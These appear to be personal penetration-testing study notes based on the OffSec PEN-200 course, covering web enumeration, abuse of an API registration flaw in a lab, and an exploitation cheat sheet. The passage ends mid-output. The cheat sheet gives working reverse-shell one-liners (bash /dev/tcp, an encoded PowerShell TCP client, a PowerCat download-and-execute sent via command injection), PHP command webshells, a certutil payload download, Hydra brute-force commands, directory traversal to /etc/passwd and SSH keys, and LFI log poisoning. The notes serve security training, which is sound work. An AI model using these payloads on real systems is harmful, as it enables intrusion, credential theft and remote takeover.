
--- 
## Enumeration
--- 

##### Fingerprinting web server with nmap:**
```
kali@kali:~$ sudo nmap -p80  -sV 192.168.50.20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 05:13 EDT
Nmap scan report for 192.168.50.20
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
##### Enumerating web server with NSE script
```
kali@kali:~$ sudo nmap -p80 --script=http-enum 192.168.50.20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 06:30 EDT
Nmap scan report for 192.168.50.20
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /login.php: Possible admin folder
|   /db/: BlogWorx Database
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
```

##### Identify Web Tecnologies 
- To identify web technologies
    - Either use wappalyzer 
    - OR run whatweb




##### Directory Brute Force with Gobuster
```
kali@kali:~$ gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

##### Quick Web Application Enumeration Checklist
- [ ] Inspect the source code
- [ ] Use web developer tools to analysis traffic flow
- [ ] Inspect the HTTP response headers, e.g. server version, web technology, unusual headers leaking info, etc
- [ ] Check robots.txt and sitemaps

#####  Enumerating and Abusing APIs

In many cases, our penetration test target is an internally-built, closed-source web application that is shipped with a number of _Application Programming Interfaces_ (API). These APIs are responsible for interacting with the back-end logic and providing a solid backbone of functions to the web application.

A specific type of API named _Representational State Transfer_ (REST) is used for a variety of purposes, including authentication.

In a typical white-box test scenario, we would receive complete API documentation to help us fully map the attack surface. However, when performing a black-box test, we'll need to discover the target's API ourselves.

We can use Gobuster features to brute force the API endpoints. In this test scenario, our API gateway web server is listening on port 5001 on 192.168.50.16, so we can attempt a directory brute force attack.

API paths are often followed by a version number, resulting in a pattern such as:

```
/api_name/v1
```

> Listing 8 - API Path Naming Convention

The API name is often quite descriptive about the feature or data it uses to operate, followed directly by the version number.

With this information, let's try brute forcing the API paths using a wordlist along with the _pattern_ Gobuster feature. We can call this feature by using the **-p** option and providing a file with patterns. For our test, we'll create a simple pattern file on our Kali system containing the following text:

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

> Listing 9 - Gobuster pattern

In this example, we are using the "{GOBUSTER}" placeholder to match any word from our wordlist, which will be appended with the version number. To keep our test simple, we'll try with only two versions.

We are now ready to enumerate the API with **gobuster** using the following command:

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (1 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/console              (Status: 200) [Size: 1985]
/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1             (Status: 200) [Size: 241]
```

> Listing 10 - Bruteforcing API Paths

We discovered multiple hits, including two interesting entries that seem to be API endpoints, _/books/v1_ and _/users/v1_.

If we browse to the **/ui** path we'll discover the entire APIs' documentation. Although this is common during white-box testing, is not a luxury we normally have during a black-box test.

Let's first inspect the **/users** API with **curl**.

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 241
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 09:27:50 GMT

{
  "users": [
    {
      "email": "mail1@mail.com",
      "username": "name1"
    },
    {
      "email": "mail2@mail.com",
      "username": "name2"
    },
    {
      "email": "admin@mail.com",
      "username": "admin"
    }
  ]
}
```

> Listing 11 - Obtaining Users' Information

The application returned three user accounts, including an administrative account that seems to be worth further investigation. We can use this information to attempt another brute force attack with **gobuster**, this time targeting the _admin_ user with a smaller wordlist. To verify if any further API property is related to the _username_ property, we'll expand the API path by inserting the admin username at the very end.

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]

===============================================================
2022/04/06 06:40:35 Finished
===============================================================
```

> Listing 12 - Discovering extra APIs

The **password** API path seems enticing for our testing purposes, so we'll probe it via **curl**.

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 10:58:51 GMT

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

> Listing 13 - Discovering API unsupported methods

Interestingly, instead of a _404 Not Found_ response code, we received a _405 METHOD NOT ALLOWED_, implying that the requested URL is present, but that our HTTP method is unsupported. By default, curl uses the GET method when it performs requests, so we could try interacting with the **password** API through a different method, such as POST or PUT.

Both POST and PUT methods, if permitted on this specific API, could allow us to override the user credentials (in this case, the administrator password).

Before attempting a different method, let's verify whether or not the overwritten credentials are accepted. We can check if the _login_ method is supported by extending our base URL as follows:

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 12:04:30 GMT

{ "status": "fail", "message": "User not found"}
```

> Listing 14 - Inspecting the 'login' API

Although we were presented with a _404 NOT FOUND_ message, the status message states that the user has not been found; another clear sign that the API itself exists. We only need to find a proper way to interact with it.

We know one of the usernames is _admin_, so we can attempt a login with this username and a dummy password to verify that our strategy makes sense.

Next, we will try to convert the above GET request into a POST and provide our payload in the required JSON[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/introduction-to-web-application-attacks/web-application-enumeration/enumerating-and-abusing-apis#fn1) format. Let's craft our request by first passing the admin username and dummy password as JSON data via the **-d** parameter. We'll also specify "json" as the "Content-Type" by specifying a new header with **-H**.

```
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
```

> Listing 15 - Crafting a POST request against the login API

The API return message shows that the authentication failed, meaning that the API parameters are correctly formed.

Since we don't know admin's password, let's try another route and check whether we can register as a new user. This might lead to a different attack surface.

Let's try registering a new user with the following syntax by adding a JSON data structure that specifies the desired username and password:

```
kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

{ "status": "fail", "message": "'email' is a required property"}
```

> Listing 16 - Attempting new User Registration

The API replied with a fail message stating that we should also include an email address. We could take this opportunity to determine if there's any administrative key we can abuse. Let's add the _admin_ key, followed by a _True_ value.

```
kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```

> Listing 17 - Attempting to register a new user as admin

Since we received no error, it seems we were able to successfully register a new user as an admin, which should not be permitted by design. Next, let's try to log in with the credentials we just created by invoking the **login** API we discovered earlier.

```
kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
```

> Listing 18 - Logging in as an admin user

We were able to correctly sign in and retrieve a JWT[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/introduction-to-web-application-attacks/web-application-enumeration/enumerating-and-abusing-apis#fn2) authentication token. To obtain tangible proof that we are an administrative user, we should use this token to change the admin user password.

We can attempt this by forging a POST request that targets the **password** API.

```
kali@kali:~$ curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

> Listing 19 - Attempting to Change the Administrator Password via a POST request

We passed the JWT key inside the _Authorization_ header along with the new password.

Sadly, the application states that the method used is incorrect, so we need to try another one. The PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a POST request, so let's try to explicitly define it next:

```
kali@kali:~$ curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

> Listing 20 - Attempting to Change the Administrator Password via a PUT request

This time we received no error message, so we can assume that no error was thrown by the application backend logic. To prove that our attack succeeded, we can try logging in as admin using the newly-changed password.

```
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
```

> Listing 21 - Successfully logging in as the admin account

Nice! We managed to take over the admin account by exploiting a logical privilege escalation bug present in the registration API.

These kind of programming mistakes happen to various degrees when building web applications that rely on custom APIs, often due to lack of testing and secure coding best practices.

So far we have relied on curl to manually assess the target's API so that we could get a better sense of the entire traffic flow.

This approach, however, will not properly scale whenever the number of APIs becomes significant. Luckily, we can recreate all the above steps from within Burp.

As an example, let's replicate the latest admin login attempt and send it to the proxy by appending the _--proxy 127.0.0.1:8080_ to the command . Once done, from Burp's _Repeater_ tab, we can create a new empty request and fill it with the same data as we did previously.

![Figure 23: Crafting a POST request in Burp for API testing](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/webintro/52e79b4472fa121dd7d260386dc6a9f7-webenum_api01.png)

Figure 23: Crafting a POST request in Burp for API testing

Next, we'll click on the _Send_ button and verify the incoming response on the right pane.

![Figure 24: Inspecting the API response value](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/webintro/95e7f350565cf4049f29a9636984b47b-webenum_api02.png)

Figure 24: Inspecting the API response value

Great! We were able to recreate the same behavior within our proxy, which, among other advantages, enables us to store any tested APIs in its database for later investigation.

Once we've tested a number of different APIs, we could navigate to the _Target_ tab and then _Site map_. We can then retrieve the entire map of the paths we have been testing so far.

![Figure 18: Using the Site Map to organize API testing](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/webintro/74035e000cf0b222b649385e049747f2-webenum_api03.png)

Figure 18: Using the Site Map to organize API testing

From Burp's Site map, we can track the API we discovered and forward any saved request to the Repeater or Intruder for further testing.

In this Learning Unit, we explored how to debug web applications through the web browser console and network developer tools. We then learned what REST APIs are, their role in web applications, and how we can approach a black-box penetration test to find weaknesses and abuse them.

In the next Learning Unit, we are going to learn about one of the most poplar and widespread vulnerabilities that affects web applications, Cross-Site Scripting.





---
## Exploitation
---
##### Useful commands:
1. reverse shell  One Liner: 
```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
We'll once again encode the special characters with URL encoding.

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

2. Simple php cmdshell:
```
<?php echo system($_GET["cmd"]);?>
```
3. Also check the simple-backdoor-php from kali /usr/share/webshell/...
```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
...
 Directory of C:\xampp\htdocs\meteor\uploads

04/04/2022  06:23 AM    <DIR>          .
04/04/2022  06:23 AM    <DIR>          ..
04/04/2022  06:21 AM               328 simple-backdoor.pHP
04/04/2022  06:03 AM                15 test.txt
               2 File(s)            343 bytes
               2 Dir(s)  15,410,925,568 bytes free
...
```
4. Encoded powershell reverse shell:
```
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


PS> exit
```
Then run in with the backdoor:
```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
5. Download a PS reverse shell using PowerCat:
```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```
> Listing - Command to download PowerCat and execute a reverse shell

Again, we'll use URL encoding for the command and send it.

```
kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```
> Listing - Downloading Powercat and creating a reverse shell via Command Injection

6. WordPress plugin aggressive scan:
```
wpscan --url http://192.168.219.244/ --enumerate p --plugins-detection aggressive --plugins-version-detection aggressive -o webserver.wpscan
```

7. Hydra HTTP-POST-FORM brute force
```
hydra -l john -P rockyou 10.10.157.95 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1&Login=Login:Unknown user or password incorrect" -V
```
8. Hydra http-get brute force
```markup
hydra -L user_list.txt -P top25_passwords.txt -u -e ns http-get://192.168.56.11/WebGoat
```
- -L user_list.txt tells Hydra to take the usernames from the user_list.txt file.
- -P top25_passwords.txt tells Hydra to take the prospective passwords from the top25_passwords.txt file.
- -u—Hydra will iterate usernames first, instead of passwords. This means that Hydra will try all usernames with a single password first and then move on to the next password. This is sometimes useful to prevent account blocking.
- -e ns—Hydra will try an empty password (n) and the username as password (s) as well as the list provided.
9. Force system execution using php only:
![[Pasted image 20231105002911.png]]
```
<?php
$download = system('certutil.exe -urlcache -split -f http://192.168.45.229/reverse2.exe reverse2.exe', $val)
?>
----------------------------------
<?php
$exec = system('reverse2.exe', $val)
?>

```

--- 
##### Directory Traversal
For example, if we find the following link, we can extract vital information from it.

```
https://example.com/cms/login.php?language=en.html
```
the URL contains a _language_ parameter with an HTML page as its value. In a situation like this, we should try to navigate to the file directly (**https://example.com/cms/en.html**). If we can successfully open it, we can confirm that **en.html** is a file on the server, meaning we can use this parameter to try other file names. ***We should always examine parameters closely when they use files as a value.***

We could reveal internal files and go from this:
```
http://mountaindesserts.com/meteor/index.php?page=admin.php
```
to this:
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```
or this:
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```
###### Encoding Special Characters with hURL
Let's use **curl** and multiple **../** sequences to try exploiting this directory traversal vulnerability in Apache 2.4.49 on the _WEB18_ machine.

```
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```

It says error. Instead, we can encoded to avoid this:
```
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash
```


##### Local File Inclusion (LFI)
This will allows us to include/upload a file on the web application and gain execution. 

--- 
Note: Directory traversal VS File Inclusion.

We can use **directory traversal** vulnerabilities to *obtain the contents of a file outside of the web server's web root*. **_File inclusion_** vulnerabilities allow us to *"include" a file in the application's running code*. This means we can use file inclusion vulnerabilities to **execute local or remote files, while directory traversal only allows us to read** the contents of a file.

For example, if we leverage a directory traversal vulnerability in a PHP web application and specify the file **admin.php**, the source code of the PHP file will be displayed. On the other hand, when dealing with a file inclusion vulnerability, the **admin.php** file will be executed instead.

--- 
Attack Example:

Let's use **curl** to analyze which elements comprise a log entry by displaying the file **access.log** using the previously-found directory traversal vulnerability. This means we'll use the relative path of the log file in the vulnerable "page" parameter in the "Mountain Desserts" web application.

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```

> Listing 13 - Log entry of Apache's access.log

Listing 13 shows that the _User Agent_[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn3) is included in the log entry. Before we send a request, we can modify the User Agent in Burp and specify what will be written to the **access.log** file.

Apart from the specified file, this command is equivalent to the directory traversal attack from the previous Learning Unit. The exploitation of directory traversal and LFI vulnerabilities mainly differs when handling executable files or content.

Let's start Burp, open the browser, and navigate to the "Mountain Desserts" web page. We'll click on the _Admin_ link at the bottom of the page, then switch back to Burp and click on the _HTTP history_ tab. Let's select the related request and send it to _Repeater_.

![Figure 8: Unmodified Request in Burp Repeater](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/commonwebattacks/d544a669f85d1a8ed794804ea3587f61-cwa_lfi_unmodfirstreqcom.png)

Figure 8: Unmodified Request in Burp Repeater

We can now modify the User Agent to include the PHP code snippet of the following listing. This snippet accepts a command via the _cmd_ parameter and executes it via the PHP _system_[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn4) function on the target system. We'll use _echo_[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn5) to display command output.

```
<?php echo system($_GET['cmd']); ?>
```

> Listing 14 - PHP Snippet to embed in the User Agent

After modifying the User Agent, let's click _Send_.

![Figure 9: Modified Request in Burp Repeater](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/commonwebattacks/a5768a72a99581707edad7a81a481e3a-cwa_lfi_modfirstreqcom.png)

Figure 9: Modified Request in Burp Repeater

The PHP code snippet was written to Apache's **access.log** file. By including the log file via the LFI vulnerability, we can execute the PHP code snippet.

To execute our snippet, we'll first update the _page_ parameter in the current Burp request with a relative path.

```
../../../../../../../../../var/log/apache2/access.log
```

> Listing 15 - Relative Path for the "page" parameter

We also need to add the _cmd_ parameter to the URL to enter a command for the PHP snippet. First, let's enter the **ps** command to verify that the log poisoning is working. Since we want to provide values for the two parameters (_page_ for the relative path of the log and _cmd_ for our command), we can use an ampersand (&) as a delimiter. We'll also remove the User Agent line from the current Burp request to avoid poisoning the log again, which would lead to multiple executions of our command due to two PHP snippets included in the log.

The final Burp request is shown in the _Request_ section of the following Figure. After sending our request, let's scroll down and review the output in the **Response** section.

![Figure 10: Output of the specified ls command through Log Poisoning](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/commonwebattacks/a6f91e6dc8a0cfedb50d28494a37ed84-cwa_lfi_pscommandcom.png)

Figure 10: Output of the specified ls command through Log Poisoning

Figure 10 shows the output of the executed **ps** command that was written to the **access.log** file due to our poisoning with the PHP code snippet.

Let's update the command parameter with **ls -la**.

![Figure 11: Using a command with parameters](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/commonwebattacks/959cb30fe38a03c629d3a6944ac2d2da-cwa_lfi_commandwithparamcom.png)

Figure 11: Using a command with parameters

The output in the _Response_ section shows that our input triggers an error. This happens due to the space between the command and the parameters. There are different techniques we can use to bypass this limitation, such as using Input Field Separators (IFS)[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn6) or URL encoding. With URL encoding, a space is represented as "%20".[7](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn7)

Let's replace the space with "%20" and press _Send_.

![Figure 12: URL encoding a space with %20](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/commonwebattacks/e49e364a3e8226a4f201ee106f2fc0c0-cwa_lfi_encodedspacecom.png)

Figure 12: URL encoding a space with %20

Figure 12 shows that our command executed correctly.



##### PHP Wrappers
PHP offers a variety of protocol wrappers to enhance the language's capabilities. For example, PHP wrappers can be used to represent and access local or remote filesystems. We can use these wrappers to bypass filters or obtain code execution via _File Inclusion_ vulnerabilities in PHP web applications. While we'll only examine the **php://filter**[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/php-wrappers#fn1) and **data://**[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/php-wrappers#fn2) wrappers, many are available.[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/php-wrappers#fn3)

We can use the **php://filter** wrapper to display the contents of files either with or without encodings like _ROT13_[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/php-wrappers#fn4) or _Base64_.[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/php-wrappers#fn5) In the previous section, we covered using LFI to include the contents of files. Using **php://filter**, we can also display the contents of executable files such as **.php**, rather than executing them. This allows us to review PHP files for sensitive information and analyze the web application's logic.

Let's demonstrate this by revisiting the "Mountain Desserts" web application. First we'll provide the **admin.php** file as a value for the "page" parameter, as in the last Learning Unit.

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

Listing 20 shows the title and maintenance text we already encountered while reviewing the web application earlier. We also notice that the \<body\> tag is not closed at the end of the HTML code. We can assume that something is missing. PHP code will be executed server side and, as such, is not shown. When we compare this output with previous inclusions or review the source code in the browser, we can conclude that the rest of the **index.php** page's content is missing.

Next, let's include the file, using **php://filter** to better understand this situation. We will not use any encoding on our first attempt. The PHP wrapper uses **resource** as the required parameter to specify the file stream for filtering, which is the filename in our case. We can also specify absolute or relative paths in this parameter.

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```
The output of Listing 21 shows the same result as Listing 20. This makes sense since the PHP code is included and executed via the LFI vulnerability. Let's now encode the output with base64 by adding **convert.base64-encode**. This converts the specified resource to a base64 string.

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...
```

> Listing 22 - Usage of "php://filter" to include base64 encoded admin.php

Listing 22 shows that we included base64 encoded data, while the rest of the page loaded correctly. We can now use the _base64_ program with the _-d_ flag to decode the encoded data in the terminal.

```
kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
